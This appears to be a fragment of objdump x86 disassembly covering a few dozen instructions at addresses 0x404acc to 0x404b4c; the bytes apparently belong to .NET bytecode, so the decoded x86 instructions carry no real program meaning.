  404acc:	28 98 00 00 0a 16    	sub    %bl,0x160a0000(%eax)
  404ad2:	16                   	push   %ss
  404ad3:	02 7b 26             	add    0x26(%ebx),%bh
  404ad6:	00 00                	add    %al,(%eax)
  404ad8:	04 02                	add    $0x2,%al
  404ada:	7b 27                	jnp    0x404b03
  404adc:	00 00                	add    %al,(%eax)
  404ade:	04 6f                	add    $0x6f,%al
  404ae0:	93                   	xchg   %eax,%ebx
  404ae1:	00 00                	add    %al,(%eax)
  404ae3:	0a 7e 17             	or     0x17(%esi),%bh
  404ae6:	00 00                	add    %al,(%eax)
  404ae8:	04 16                	add    $0x16,%al
  404aea:	94                   	xchg   %eax,%esp
  404aeb:	13 0a                	adc    (%edx),%ecx
  404aed:	11 0a                	adc    %ecx,(%edx)
  404aef:	45                   	inc    %ebp
  404af0:	0e                   	push   %cs
  404af1:	00 00                	add    %al,(%eax)
  404af3:	00 05 00 00 00 ff    	add    %al,0xff000000
  404af9:	00 00                	add    %al,(%eax)
  404afb:	00 ec                	add    %ch,%ah
  404afd:	01 00                	add    %eax,(%eax)
  404aff:	00 d9                	add    %bl,%cl
  404b01:	02 00                	add    (%eax),%al
  404b03:	00 4d 04             	add    %cl,0x4(%ebp)
  404b06:	00 00                	add    %al,(%eax)
  404b08:	28 06                	sub    %al,(%esi)
  404b0a:	00 00                	add    %al,(%eax)
  404b0c:	28 08                	sub    %cl,(%eax)
  404b0e:	00 00                	add    %al,(%eax)
  404b10:	3d 0a 00 00 c0       	cmp    $0xc000000a,%eax
  404b15:	0b 00                	or     (%eax),%eax
  404b17:	00 43 0d             	add    %al,0xd(%ebx)
  404b1a:	00 00                	add    %al,(%eax)
  404b1c:	55                   	push   %ebp
  404b1d:	0e                   	push   %cs
  404b1e:	00 00                	add    %al,(%eax)
  404b20:	1d 10 00 00 d7       	sbb    $0xd7000010,%eax
  404b25:	13 00                	adc    (%eax),%eax
  404b27:	00 81 17 00 00 38    	add    %al,0x38000017(%ecx)
  404b2d:	d3 1a                	rcrl   %cl,(%edx)
  404b2f:	00 00                	add    %al,(%eax)
  404b31:	02 7b 25             	add    0x25(%ebx),%bh
  404b34:	00 00                	add    %al,(%eax)
  404b36:	04 6f                	add    $0x6f,%al
  404b38:	99                   	cltd
  404b39:	00 00                	add    %al,(%eax)
  404b3b:	0a 23                	or     (%ebx),%ah
  404b3d:	9a 99 99 99 99 99 b9 	lcall  $0xb999,$0x99999999
  404b44:	3f                   	aas
  404b45:	35 06 02 28 5f       	xor    $0x5f280206,%eax
  404b4a:	00 00                	add    %al,(%eax)
  404b4c:	06                   	push   %es
